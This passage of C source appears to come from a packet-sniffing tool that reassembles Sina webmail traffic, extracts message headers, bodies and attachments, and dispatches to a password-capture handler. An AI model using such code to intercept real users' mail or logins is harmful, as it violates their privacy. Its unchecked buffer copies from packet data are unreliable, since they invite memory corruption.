	close(fd);
}

int analyse_sina_attach_recive(Mail_info *mail_info, char *data, unsigned int datalen, struct tcphdr *tcp, int is_b_s)
{//printf("function:analyse_sina_attach_recive\n");
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	unsigned int attach_len;
	static int n;
	static int attach_length = -1, getted_size = 0;

	if (is_b_s)
	{
		char tmp_id[MAX_ID_LEN+1];
		int result;

		if(!strncmp(data, "GET /classic/base_download_att.php", 34))
		{
			result = get_mid_2(data, tmp_id);
			if(result==-1) 
				return -1;
			htmldecode_full(tmp_id, mail_info->mail_id);
		}
	}
	else
	{
		if(!strncmp(data,"HTTP/1.1 200 OK\r\n",15))
		{
			mail_info->recive_length = get_http_length(data);
			n = judge_chunk(data);
			//printf("mail_info->recive_length = %d\n", mail_info->recive_length);
			if(mail_info->recive_length <= 0)
			{
				//printf("mail_info->recive_length < 0\n");
				return -1;
			}
			mail_info->recive_length += 1000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data == NULL)
			{
				//printf("mail_info->recive_data == NULL\n");
				return -1;
			}
			memset(mail_info->recive_data, 0, mail_info->recive_length);
			mail_info->http_seq = seq;
		}
		if (mail_info->recive_data != NULL)
		{
			off_seq = seq-mail_info->http_seq;
			range = off_seq+datalen;
			if (range>mail_info->recive_length)
			{
				//mail_info->recive_data = realloc(mail_info->recive_data,mail_info->recive_length+8047);
				mail_info->recive_data = (char *)realloc(mail_info->recive_data,range+1);
				if(mail_info->recive_data == NULL)
					return 0;
				mail_info->recive_length=range;
				memcpy(mail_info->recive_data + off_seq, data, datalen); 
			}
			else
			{
				memcpy(mail_info->recive_data+off_seq, data, datalen);
			}
		}
		if (tcp->fin == 1)
		{
			mail_info->is_complished = 1;
			attach_len = mail_info->recive_length - 1000;
			write_attach_down_2(mail_info, attach_len,n);
			del_mail_node(mail_info);
		}

		return 0;
	}
}

int analyse_sinavip_recive_up(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp, int is_b_s)
{
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int len;
	int range;
	char *p=NULL;
	if(!is_b_s){
		if(!strncmp(data,"HTTP/1.",7)){
			mail_info->recive_length = get_http_length(data);
			if(mail_info->recive_length<=0){
				return -1;
			}
			mail_info->recive_length=18000;
			mail_info->recive_data =(char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data ==NULL){
				return -1;
			}
			p=strstr(data,"\r\n\r\n");
			if(p==NULL){
				return -1;
			}
			
			len = datalen -(p-data);
			mail_info->http_seq = seq+p-data;
			if(len<0||mail_info->recive_length<len){
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			memcpy(mail_info->recive_data,p,len);
			range=len;
		}
		else if(mail_info->recive_data !=NULL){
			off_seq=seq-mail_info->http_seq;
			range=off_seq+datalen;
			if(range>mail_info->recive_length){
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
		}
		if(range>15000){
			mail_info->is_complished =1;
			write_sinavip_recive_file(mail_info);
		}	
	}
}

void analyse_sinacn_attach(Attach_info *attach_info,Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{//printf("function :analyse_sinacn_attach\n");
	unsigned int seq=ntohl(tcp->seq);
	int result=0;
	int off_seq;
	int data_seq;

	int flag = 0;
	char *p;
	if(is_b_s)
	{//printf("\n1\n");
		if (!strncmp(data, "POST /uploadatt.php",19) || !strncmp(data,"POST /classic/uploadatt.php",27))
		{//printf("\n2\n");
			char *p1;
			p1 = NULL;
			attach_info->recive_length = 0;
			
			char *p = strstr(data, "\r\nContent-Length: ");
			if (p == NULL)
			{
				attach_info->recive_length = 5000;
			}
			else
			{
				//printf("\n234");
				p += 18;
				while( *p != '\r') 
				{
					attach_info->recive_length = attach_info->recive_length * 10 + (*p - '0');
					p++;
				}
			}
			
			if (attach_info->recive_length <= 0)
				return ;
			
			attach_info->recive_length += 1000;		
			//attach_info->recive_length *= datalen*4;//.....lihan 内存地址溢出
			
			attach_info->recive_data = (char *)malloc(attach_info->recive_length+1);
			if(attach_info->recive_data == NULL)
				return ;
			memset(attach_info->recive_data,0,attach_info->recive_length+1);
			
			attach_info->start_seq = seq; 
			memcpy(attach_info->recive_data, data, datalen);
		}
		else
		{//printf("\n3\n");
			if((attach_info->recive_data != NULL) && datalen)
			{//printf("\n4\n");
				off_seq = seq - attach_info->start_seq;
				if ((off_seq+ datalen) > attach_info->recive_length)
				{
					attach_info->recive_data = (char *)realloc(attach_info->recive_data,attach_info->recive_length+((off_seq+ datalen-attach_info->recive_length)/5000+1)*5000);
					if(attach_info->recive_data == NULL)
					{
						return;
					}
					attach_info->recive_length+=((off_seq+ datalen-attach_info->recive_length)/5000+1)*5000;
					memcpy(attach_info->recive_data + off_seq, data, datalen);				
				}
				else
				{
					memcpy(attach_info->recive_data + off_seq, data, datalen);
				}
			}
		
		}
		if(attach_info->recive_data != NULL && !attach_info->is_get_ok)
		{//printf("\n5\n");
			if(tcp->fin)
			{//printf("\n6\n");
				attach_info->is_get_ok=1;
				attach_info->is_complished =1;
				char *p1=strstr(attach_info->recive_data,"filename\"\r\n\r\n");
				if(p1 == NULL)
				{
					return;
				}	
				p1+=13;
				char *p2=strstr(p1,"\r\n");
				if(p2 == NULL)
				{
					return;
				}
				strncpy(attach_info->attach_name,p1,p2-p1);//the name of attach file
				
				p1=strstr(p1,"application/octet-stream\r\n\r\n");
				p1+=28;  
				p2 = memfind(p1, "\r\n----------", attach_info->recive_length-(p1-attach_info->recive_data)-1000+330);
				if(p2 == NULL)
				{
					return ;
				}
				struct timeval tv;//creat temp attach file
				struct timezone tz;
				gettimeofday(&tv,&tz);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",attach_down_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);
				if (fd ==-1)
				{
					return ; 
				}
				write(fd,p1,p2-p1);
				close(fd);
			}
		} 
	}
	else
	{//printf("\n7\n");
		if(!attach_info->is_get_ok)
		{//printf("\n8\n");

			char http_ok_head[21]="HTTP/1.1 ";
			if(!strncmp(data,http_ok_head,9))
			{
				attach_info->is_get_ok=1;
				attach_info->is_complished =1;
				//Content-Disposition: form-data; name="Filedata"; filename="hello.c"
				char *p1 = strstr(attach_info->recive_data, "filename");
				if(p1 == NULL)
				{
					//printf("p1 == NULL\n");
					return;
				}
				
				p1+=10;
				char *p2=strstr(p1,"\"\r\n");
				if(p2 == NULL)
				{
					//printf("p2 == NULL\n");
					return;
				}
				strncpy(attach_info->attach_name,p1,p2-p1);//the name of attach file
				
				//Content-Type: text/plain
				p1=strstr(p1, "Content-Type: text/plain");
				if(p1 == NULL)
				{
					return;
				}
				p1+=24;
				p2 = memfind(p1, "\r\n----------", attach_info->recive_length-(p1-attach_info->recive_data)-1000+330);
				if(p2 == NULL)
				{
					p2 = strstr(attach_info->recive_data,"\r\n\r\n")+4+attach_info->recive_length-1000-153;
					if(p2 == NULL)
						return ;
				}
				struct timeval tv;//creat temp attach file
				struct timezone tz;
				gettimeofday(&tv,&tz);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",attach_down_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);

				if (fd ==-1)
				{
					//printf("fd ==-1\n");
					return ;
				}
				write(fd,p1,p2-p1);
				close(fd);
				p1 = strstr(data, "{\"id\":\"");
				if(p1 == NULL)
				{
					return;
				}
				if(p1 != NULL)
				{
					p1+=7;
				}
				p2 = strstr(p1, "\",\"");
				strncpy(attach_info->ID_str,p1,p2-p1);//the rid of attach file
				attach_info->ID_str[p2-p1]=0;
				//printf("attach_info->ID_str = %s\n", attach_info->ID_str);

				strncpy(mail_info->ID_str,p1,p2-p1);//the rid of attach file
				mail_info->ID_str[p2-p1]=0;
				//printf("mail_info->ID_str = %s\n", mail_info->ID_str);
				int path_len = strlen(attach_info->path_of_here);
				//printf("path_len = %d\n", path_len);

				memset(mail_info->path_of_here, 0 ,MAX_PATH_LEN+1);
				memcpy(mail_info->path_of_here,attach_info->path_of_here,path_len);
			}
		}
	}	
}

//////////////////////////////////////////////////////////////////////////
// analyse_sina_read为新增函数，先解chunked，再解gzip.lihan  2017.3.7/////
/////////////////////////////////////////////////////////////////
  
int analyse_sina_read(Mail_info *mail_info, char *data, unsigned int datalen, struct tcphdr *tcp, int is_b_s,int new_com)
{
//analyse_sina_read为新增函数，先解chunked，再解gzip. lihan  2017.3.7
	int result;
	char *dest = NULL;
	static int flag = -1;
	static int flagg = -1;

	if (is_b_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, datalen, tcp);
			printf("result : %d\n", result);//
			return result;
		}
	} 
	else 
	{
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{
			if(strstr(data, "Content-Encoding: gzip\r\n"))
				flag = 1;
			else
				flag = 0;
			if(strstr(data, "Transfer-Encoding: chunked\r\n"))
				flagg = 1;
			else
				flagg = 0;
		}
		if (!mail_info->is_complished) 
		{
			if(flagg == 0)
			{
				printf("\ngzip ...\n");//
				result = write_to_okdata(mail_info, data, datalen, tcp);
				mail_info->is_ok_chunked = 0;
			}
			else
			{
				result = write_to_okdata_chunked_gzip(mail_info, data, datalen, tcp);
				mail_info->is_ok_chunked = 1;
			}
			if (result == -1)
			{
				printf("write_to_okdata ... Error!\n");//
				return -1;
			}
		}
		if(datalen < 10  || tcp->fin == 1 || !memcmp(data + datalen - 5, "0\r\n\r\n", 5) || !memcmp(data + datalen -2, "\0\0", 2) || !strncmp(data + datalen - 11, "</script>\r\n",11) || !strncmp(data + datalen - 9, "</script>",9))
		{
			mail_info->is_complished = 1;
			if(flag == 1)
			{
				if (mail_info->is_ok_chunked)
				{
					Chunked(mail_info);
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length, &dest);
							if(result == -1) 
							    result = decomp_gzip(mail_info->recive_data, mail_info->recive_length, &dest);
						}
					}
				}
				else
				{
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length - 2, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length - 2, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						}
					}
				}
                
				if (result == -1) 
				{
					LOG_WARN("webmail:analyse_163_rcvmail1: decomp_zip return error!\n");
					return -1;
				}
                
				free(mail_info->recive_data);
				mail_info->recive_data = dest;
				dest = NULL;
			}

			//writefile163_rcvmail2(mail_info);///..........lihan
            write_sina_read(mail_info, new_com);
			return 0;
		}
	}
}

//////////////////////lihan add sian_read 2017.3.8  ///////////////
//////////////////////////////////////////////////////////////////////////
// write_sina_read为新增函数，read行为入库程序（send入库格式不一样）lihan        2017.3.8/////
/////////////////////////////////////////////////////////////////
void  write_sina_read(Mail_info * mail_info, int new_com)//lihan add
{
	char *p1=NULL, *p2=NULL,*p3=NULL;
	
	int len;
	if(mail_info->recive_data == NULL)
		return;
	//{"from":"13554062593@189.cn","to":"\"47712028@qq.com\"
	p1=strstr(mail_info->recive_data,"\"from\":\"");
	if(p1==NULL)
		return;
	p1+=8;
	p2=strstr(p1,"\",\"to\"");
	if(p2==NULL)
		return;
	len = p2- p1;
	if(len<0)
		return;
	if(len>MAX_FROM_LEN) 
		len=MAX_FROM_LEN;
	strncpy(mail_info->from,p1,len);
	mail_info->from[len]=0;
	clear_from(mail_info->from);

    p1=strstr(mail_info->recive_data,"\"to\":\"");
	//"to":"\"47712028@qq.com\" <47712028@qq.com>",
	if(p1==NULL)
		return;
    p1+=8;
	p2=strstr(p1,"\",\"cc\"");
	if(p2==NULL)
		return;
	len = p2-p1;
	if(len>MAX_TO_LEN) 
		len=MAX_TO_LEN;
	strncpy(mail_info->to,p1,len);
	mail_info->to[len]=0;


if((p1=strstr(mail_info->recive_data,"\"cc\":\""))!=NULL)
   {
	//"cc":"\"2369501824@qq.com\" <2369501824@qq.com>","bcc":
	p1+=29;
	p2=strstr(p1,">");
	len = p2-p1;
	if(len>MAX_TO_LEN) 
		len=MAX_TO_LEN;
	strncpy(mail_info->cc,p1,len);
	mail_info->cc[len]=0;
   // printf("mail_info->cc:%s\n",mail_info->cc);
   }
  
  if((p1=strstr(mail_info->recive_data,"\"bcc\""))!=NULL) 
   {//"bcc":"","date":
	p1+=7;
	p2=strstr(p1,"\",\"date\"");
	len = p2-p1;
	if(len>MAX_TO_LEN) 
		len=MAX_TO_LEN;
	strncpy(mail_info->bcc,p1,len);
	mail_info->bcc[len]=0;
   // printf("bcc:%s\n",mail_info->bcc);
   } 
		
		
	p1=strstr(mail_info->recive_data,"\"date\":");
	//printf("p1...%s\n",p1);
	if(p1==NULL)
	{//"date":1487918965,"
		return;
	}
	else{	
		char dest1[MAX_TIME_LEN+1] = {0};
		time_t timeval;
			
		p1+=11;
		p2=strstr(p1,",");
		memcpy(dest1, p1, 10);

	    struct tm *tm_ptr;
		timeval = strtol(dest1,NULL,0);
		tm_ptr = localtime(&timeval);
	    snprintf(mail_info->sent_time, MAX_TIME_LEN, "%04d-%02d-%02d %02d:%02d:%02d", tm_ptr->tm_year + 1900, tm_ptr->tm_mon + 1, tm_ptr->tm_mday, tm_ptr->tm_hour, tm_ptr->tm_min, tm_ptr->tm_sec);	
	//	printf("sent_time: %s\n", mail_info->sent_time);//
	}
    
	p1=strstr(mail_info->recive_data,"\"subject\":\"");
	if(p1==NULL){//"subject":"lihanzhuti\u5475\u5475","priority"
		return;}
	p1+=11;
	p2=strstr(p1,"\",\"");
	if(p2==NULL){
		return;}
	len=p2-p1;
	if(len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
	strncpy(mail_info->subject,p1,len);
	//printf("subject: %s\n", mail_info->subject);//
	mail_info->subject[len]=0;
	

	p1=strstr(mail_info->recive_data,"\"body\":\"");
	if(p1==NULL){
		return;}
	p1+=8;
	p2=strstr(p1,"\",\"");
	if(p2==NULL){//printf("\n8\n");//
		return;}
	len=p2-p1;
	char * temp = (char *)malloc(len + 1);
	memset(temp, 0, len + 1);
	memcpy(temp, p1, len);
	//printf("temp %s\n", temp);//
	mail_info->content = clear_html_tag(temp);
	free(temp);
	temp = NULL;
    

	p1=strstr(mail_info->recive_data,"mid\":\"");
	if(p1==NULL){//printf("\n9\n");
		return;}
	p1+=6;
	p2=strstr(p1,"\",");
	if(p2==NULL){//printf("\n10\n");
		return;}
	len=p2-p1;
	if(len>MAX_ID_LEN){//printf("\n11\n");//
		return;}
	strncpy(mail_info->connect_id,p1,len);
	//printf("connect_id: %s",mail_info->connect_id);//
	mail_info->connect_id[len]=0;
	memcpy(mail_info->mail_id,mail_info->connect_id,len);
	mail_info->mail_id[len]=0;

	create_dir(mail_info->save_path,"sina",mail_info->from);
	write_to_file(mail_info);
	delete_mail_info(mail_info);
	
}

//////////////////////////////////////////
int analyse_sina(void *tmp,char *data,unsigned int datalen, struct tcphdr *tcp,int is_b_s,int mora)
{
	Mail_info *mail_info;
	unsigned int lowtype;
	int result = 0;
	int new_com;
	new_com = 0;
	
	if(!mora)
	{
		mail_info = (Mail_info *)tmp;
		lowtype = mail_info->mail_type;
		lowtype = lowtype & 0X00FF;
		if (lowtype == 0x23)
		{
			new_com = 1;
		}
        
		switch(lowtype)
		{
			/*case 0x11:
				analyse_sina_content(mail_info,data, datalen,tcp,is_b_s);
				break;*/
			//yanglei
			case 0x12:
				//analyse_sinacn_content(mail_info,data, datalen,tcp,is_b_s);
				result = analyse_sina_content(mail_info,data, datalen,tcp,is_b_s);
				break;
                
			case 0x15:
				result = analyse_sina_content_vip(mail_info,data,datalen,tcp,is_b_s);
				break;
                
			case 0x01:
				result = analyse_sina_psword(mail_info,data,datalen,tcp,is_b_s);
				break;
                
			case 0x02:
				result = analyse_sina_psword_com(mail_info,data,datalen,tcp,is_b_s);
				break;

			case 0x30:   // Phone receive mail
				result = analyse_sina_recive_m(mail_info,data,datalen,tcp,is_b_s);
				break;

			case 0x31:   // PC receive mail
				result = analyse_sina_recive(mail_info,data,datalen,tcp,is_b_s,new_com);
				break;
				
			case 0x38:
				 result = analyse_sina_read(mail_info, data, datalen, tcp, is_b_s,new_com);
				 break;
				 
			case 0x32:   //recv mail body
				result = analyse_sina_recive_down(mail_info,data,datalen,tcp,is_b_s,new_com);
				break; 
                
			case 0x33:
				result = analyse_sina_attachzip_recive(mail_info,data,datalen,tcp,is_b_s);
				break;
                
			case 0x34:
				result = analyse_sina_attach_recive(mail_info,data, datalen, tcp,is_b_s);
				break;
                
			case 0x41:
				result = analyse_sinavip_recive_up(mail_info,data,datalen,tcp,is_b_s);
				break;
                
			//YANGLEI
			case 0x23:   //recv mail head
				result = analyse_sina_recive(mail_info,data,datalen,tcp,is_b_s,new_com);
				break;
                
			//case 0x81:   //recv mail body
			    //result=analyse_sina_recive(mail_info,data,datalen,tcp,is_b_s);
				//result=analyse_sina_recive_down(mail_info,data,datalen,tcp,is_b_s);
				//break;
			default:
				break;
		}

		if(result == -1)
			delete_mail_info(mail_info);

		if(lowtype == 0x42)//upload sina  lihan   2017.3.2................4
		{		
			Attach_info *attach_info = (Attach_info *)tmp;
			analyse_sinacn_attach(attach_info, mail_info, data, datalen, tcp, is_b_s); 
		}
	}
	//lihan add sian_m_mail_upload 2017.3.20
	else
	{
		Attach_info *attach_info = (Attach_info *)tmp;
		lowtype = attach_info->attach_type;
		lowtype = lowtype & 0X00FF;
		switch(lowtype) 
		{
			case 0x66://upload  lihan add 2017.3.4
			result = analyse_m_sina_upload(attach_info, data, datalen, tcp, is_b_s); 
			break;
		
			default:
			break;
		}
		if (result == -1) 
		{
			del_attach_node(attach_info);
			delete_attach(attach_info);
		}
	}
}

